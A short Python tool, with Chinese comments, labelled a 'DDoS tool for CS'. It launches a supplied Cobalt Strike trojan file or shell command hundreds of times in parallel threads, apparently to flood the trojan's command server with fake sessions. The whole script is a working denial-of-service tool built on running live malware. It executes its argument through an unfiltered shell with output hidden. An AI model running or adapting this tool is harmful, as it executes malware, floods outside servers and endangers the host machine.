#!/usr/bin/env python3
import argparse
import subprocess
import threading

def run_exe(file):
    #   若执行失败，请删除【stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL】输出/错误输出重定向，查看报错分析
    subprocess.Popen(file, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True, executable='/bin/bash')

def local_run(file, thread_num):
    confirm = input('\n\033[31m[-] 你将使用的本地运行CS木马，请确保环境隔离，莫送人头，是否继续: (Y/N): \033[0m \n\033[33m<Potato>$ \033[0m').lower()
    if not confirm.startswith('y'):
        print(f"\033[31m[x] 输入选择非Y，退出该程序\033[0m")
        return

    threads = []
    print(f"\033[32m[o] 正在本地初始化线程，线程数{str(thread_num)}条,请稍后……\033[0m")

    try:
        for thread in range(thread_num):
            t = threading.Thread(target=run_exe, args=(file,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    except Exception as e:
        print(f"\033[31m[x] Error:{str(e)}\033[0m")
        return

    print(f"\033[32m[o] 本地DDOS成功，当前CS木马线程数已启动{str(thread_num)}条\033[0m")

def main():
    parser = argparse.ArgumentParser(description="DDoS tool for CS.")
    parser.add_argument("-f", "--file", dest="filename", type=str, required=True, help="CS木马文件路径/执行命令")
    parser.add_argument("-t", "--threads", dest="thread_num", default=300, type=int, help="线程数，默认300")
    args = parser.parse_args()
    file = args.filename
    thread_num = args.thread_num

    local_run(file, thread_num)

if __name__ == "__main__":
    main()